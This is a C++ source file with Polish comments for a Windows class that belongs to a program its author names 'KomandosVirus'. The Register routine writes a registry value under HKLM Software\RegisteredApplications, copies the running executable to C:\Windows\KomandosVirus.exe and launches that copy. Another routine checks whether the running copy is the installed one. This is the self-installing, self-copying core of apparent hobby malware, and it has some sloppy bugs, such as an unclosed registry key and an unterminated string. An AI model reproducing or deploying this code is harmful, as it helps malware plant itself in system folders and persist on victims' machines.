#include "RegEditer.h"
#include "Exception.h"
#include <iostream>
#include <fstream>
#include <Shlobj.h>

using namespace std;

bool RegEditer::IsRegistered()
{
    HKEY key;
    bool result = true;

    // otwarcie klucza
    if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\RegisteredApplications\\"), &key) != ERROR_SUCCESS)
    {
        throw Exception("Nie udalo sie otworzyc klucza [Software\\RegisteredApplications\\]");
    }

    // sprawdzenie czy klucz istnieje
    char value[MAX_PATH];
    DWORD value_length = MAX_PATH;
    DWORD type = REG_SZ;

    if (RegQueryValueEx(key, TEXT("Komandos"), 0, &type, (LPBYTE)&value, &value_length) == ERROR_FILE_NOT_FOUND)
    {
        result = false;
    }

     RegCloseKey(key);
     return result;

}

bool RegEditer::IsMainCopy()
{
    HKEY key;
    bool result = true;

    // otwarcie klucza
    if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\RegisteredApplications\\"), &key) != ERROR_SUCCESS)
    {
        throw Exception("Nie udalo sie otworzyc klucza [Software\\RegisteredApplications\\]");
    }

    // sprawdzenie czy klucz istnieje
    char value[MAX_PATH];
    DWORD value_length = MAX_PATH;
    DWORD type = REG_SZ;

    if (RegQueryValueEx(key, TEXT("Komandos"), 0, &type, (LPBYTE)&value, &value_length) == ERROR_FILE_NOT_FOUND)
    {
        throw Exception("Nie udalo sie odczytac klucza [Software\\RegisteredApplications\\]");
    }

    string regPath(value);
    //string regPath = getRegKey("Software\\RegisteredApplications\\", "Komandos");

    //cout << "regPath: " << regPath << endl;
    //cout << "getMyPath: " << getMyLongPath() << endl;

    if(regPath != getMyLongPath())
    {
        result = false;
    }

    //RegCloseKey(key);
    return result;
}

void RegEditer::Register()
{
    string destOut = "C:\\Windows\\KomandosVirus.exe";
    // rejestracja

    HKEY key;
    // otwarcie klucza
    if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\RegisteredApplications\\"), &key) != ERROR_SUCCESS)
    {
        throw Exception("Nie udalo sie otworzyc klucza [Software\\RegisteredApplications\\]");
    }

    if (RegSetValueEx(key, TEXT("Komandos"), 0, REG_SZ, (LPBYTE)destOut.c_str(), strlen(destOut.c_str())*sizeof(char)) != ERROR_SUCCESS)
    {
        throw Exception("Nie udalo sie zarejestrowac klucza [Software\\RegisteredApplications\\]");
    }

    RegCloseKey(key);

    //kopiowanie

    ifstream ifs(getMyLongPath().c_str(), ios::binary);
    ofstream ofs(destOut.c_str(), ios::binary);

    ofs << ifs.rdbuf();
    ifs.close();
    ofs.close();

    // odpalenie nowej instancji
    system(destOut.c_str());

}

string RegEditer::getMyPath()
{
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    string::size_type pos = string( buffer ).find_last_of( "\\/" );

    return string( buffer ).substr( 0, pos);
}

string RegEditer::getMyLongPath()
{
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    string::size_type pos = string( buffer ).find_last_of( "\\/" );
    //return string( buffer ).substr( 0, pos);

    return string(buffer);
}

char* RegEditer::GetMyName()
{
    string name = this->getMyLongPath();
    char *result = new char[name.length()];

    for(int i = 0; i < name.length(); i++)
        result[i] = name[i];

    return result;
}
